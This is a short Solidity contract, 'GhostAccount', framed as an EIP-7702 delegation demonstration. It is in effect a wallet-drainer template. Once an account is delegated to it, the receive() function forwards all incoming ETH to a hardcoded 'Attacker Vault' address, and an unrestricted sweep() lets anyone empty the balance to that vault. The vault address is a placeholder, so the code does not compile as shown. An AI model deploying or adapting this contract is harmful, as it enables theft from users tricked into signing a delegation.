// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title GhostAccount
 * @author CatWithHeadphones (via Gemini Analysis)
 * @notice Logic contract for EIP-7702 delegation demonstration.
 * @dev This contract is designed to be "attached" to an EOA via EIP-7702.
 * Once delegated, it automatically intercepts and forwards all incoming ETH.
 */
contract GhostAccount {
    // The hardcoded destination for intercepted funds
    // Representing the "Attacker Vault" or a secure "Cold Wallet"
    address public constant VAULT = 0xhacker_vault_address_here;

    /**
     * @dev Triggered when the EOA receives ETH. 
     * In a 7702 context, 'this' refers to the EOA's address, 
     * but 'code' is executed from this implementation.
     */
    receive() external payable {
        uint256 amount = address(this).balance;
        if (amount > 0) {
            // Low-level call to ensure the transfer is gas-efficient 
            // and generates an "Internal Transaction" on block explorers.
            (bool success, ) = VAULT.call{value: amount}("");
            
            // Revert is necessary to prevent funds from being "stuck" 
            // if the vault cannot receive them.
            require(success, "Automatic forwarding failed");
        }
    }

    /**
     * @dev Helper function to sweep any tokens or accidentally held ETH.
     */
    function sweep() external {
        uint256 balance = address(this).balance;
        if (balance > 0) {
            payable(VAULT).transfer(balance);
        }
    }
}
